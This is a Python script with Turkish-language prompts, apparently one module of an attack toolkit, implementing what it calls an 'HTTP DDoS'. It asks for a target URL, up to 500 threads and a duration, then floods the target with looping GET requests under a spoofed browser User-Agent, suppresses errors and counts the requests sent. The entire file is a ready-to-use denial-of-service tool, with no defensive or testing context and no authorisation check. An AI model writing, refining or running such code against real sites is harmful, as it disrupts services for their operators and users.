import requests
import threading
import time
from rich.console import Console

console = Console()


def run():
    url = console.input("[bold white]  Hedef URL (https://...): [/]").strip()
    thread_str = console.input("[bold white]  Thread (varsayilan 50): [/]").strip()
    threads_num = int(thread_str) if thread_str.isdigit() and 0 < int(thread_str) <= 500 else 50
    duration_str = console.input("[bold white]  Sure (saniye, varsayilan 30): [/]").strip()
    duration = int(duration_str) if duration_str.isdigit() else 30

    if not url:
        console.print("[red]  URL bos olamaz.[/]")
        return
    if not url.startswith("http"):
        url = "https://" + url

    console.print(f"[#818cf8]  HTTP DDoS: {url} ({threads_num} thread, {duration}s)[/]")
    console.print("[yellow]  Ctrl+C ile durdurun.[/]")

    stop = [False]
    sent = [0]

    def attack():
        while not stop[0]:
            try:
                requests.get(url, timeout=5,
                             headers={"User-Agent": "Mozilla/5.0"})
                sent[0] += 1
            except Exception:
                pass

    try:
        threads = []
        for _ in range(threads_num):
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            threads.append(t)

        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            console.print(f"\r[#818cf8]  Istek: {sent[0]} | Sure: {elapsed}/{duration}s[/]", end="")
            time.sleep(1)

        stop[0] = True
        time.sleep(0.5)
    except KeyboardInterrupt:
        stop[0] = True

    console.print(f"\n[#818cf8]  Tamamlandi. Gonderilen istek: {sent[0]}[/]")
